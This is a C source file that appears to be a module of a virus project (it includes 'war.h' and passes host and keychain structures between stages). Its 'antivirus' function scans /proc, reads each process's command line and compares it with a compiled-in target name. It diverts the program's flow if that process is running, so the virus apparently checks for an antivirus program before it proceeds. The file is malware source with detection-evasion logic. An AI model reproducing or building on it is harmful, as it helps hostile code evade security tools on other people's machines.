#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline bool is_pid(const char *str)
{
	return str[0] >= 0x30 && str[0] <= 0x39;
}

__attribute__((always_inline)) static inline void update_path(char *path, const char *filename, const size_t path_size)
{
	const char cmd[] = "/cmdline";
	const size_t filename_size = _strlen(filename);

	_bzero(path + path_size, PATH_MAX - path_size);

	_memcpy(path + path_size, filename, filename_size);
	_memcpy(path + (path_size + filename_size), cmd, _strlen(cmd));
}

__attribute__((always_inline)) static inline bool is_antivirus(const char *path, const char *target)
{
	int fd;
	int offset = 0;
	char buf[PATH_MAX] = {0};

	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
		return false;

	_read(fd, buf, _strlen(target) + 1);
	_close(fd);

	while (buf[offset] && (buf[offset] == '.' || buf[offset] == '/'))
		offset++;

	if (_strncmp(buf + offset, target, _strlen(buf) + 1) == 0)
		return true;

	return false;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void antivirus(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	int fd;
	size_t limit;
	size_t index;

	struct linux_dirent64 *dirp;
	char buf[BUFF_SIZE];

	char path[PATH_MAX] = "/proc/";
	const size_t size = _strlen(path);
	char target[] = TARGET;

	if ((fd = _open(path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
	{
		context = ABORT;
		goto label;
	}

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		index = 0;
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);
			index += dirp->d_reclen;

			if (is_pid(dirp->d_name) == false)
				continue;

			update_path(path, dirp->d_name, size);
			if (is_antivirus(path, target) == true)
			{
				context = ABORT;
				goto label;
			}
		}
	}

label:
	_close(fd);

	if (context == ABORT)
		execution(host, keychain, context);
	else
		init(host, keychain, context);
}

